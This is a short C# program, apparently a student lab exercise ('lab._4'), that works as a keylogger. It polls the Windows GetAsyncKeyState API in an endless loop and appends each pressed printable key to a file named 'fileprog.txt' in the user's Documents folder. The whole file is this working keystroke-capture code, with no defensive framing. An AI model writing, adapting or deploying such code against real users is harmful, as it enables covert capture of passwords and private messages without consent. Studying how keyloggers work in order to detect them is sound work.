using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

namespace lab._4
{
    class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

       // static string kelLog = "";

        static void Main(string[] args)
        {
            String file = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            if (!Directory.Exists(file))
            {
                Directory.CreateDirectory(file);
            }

            String path = (file + @"\fileprog.txt");

            if (!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path))
                {
                   
                }
            }
            Console.Clear();
            while (true)
            {
                Thread.Sleep(120);

                for (int i = 32; i < 127; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState !=0) 
                    {
                        Console.Write((char) i + ";");
                        using (StreamWriter sw = File.AppendText(path))
                        {
                            sw.Write((char) i);
                        }
                    }
                }
            }
        }
    }
}